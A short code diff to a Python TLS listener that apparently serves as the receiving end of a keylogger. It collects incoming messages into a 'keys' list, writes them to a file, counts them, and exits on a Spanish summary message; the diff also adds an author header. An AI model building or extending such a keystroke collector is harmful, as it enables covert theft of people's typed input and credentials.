@@ -7,7 +7,12 @@ from colorama import Fore
 from pathlib import Path
 import certs
 
-
+#
+# Autor   ->  an0mal1a
+# Name    ->  Pablo
+# GitHub  ->  https://github.com/an0mal1a
+# Correo  -> pablodiez024@proton.me
+#
 
 
 def get_user_path():
@@ -52,11 +57,17 @@ def connec(cert, key):
     print(Fore.CYAN + f"[!] Connection on port 5000...\t{addr} ")
     secure_conn = context.wrap_socket(conn, server_side=True)
 
+    num_keys = 0
     while True:
         msg = recv_out(secure_conn).decode()
         if __name__ == "__main__":
             print(msg)
+
+        if "[!] Este ha sido mi resumen:" in msg:
+            exit()
+
         keys.append(msg)
+        num_keys += 1
 
         write_file(msg, location, filename)
 
@@ -76,9 +87,10 @@ def main():
     except KeyboardInterrupt:
         exit()
 
+
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(Fore.RED + "\n\t Exiting..."+ Fore.RESET)
+        print(Fore.RED + "\n\t Exiting..." + Fore.RESET)
         exit()
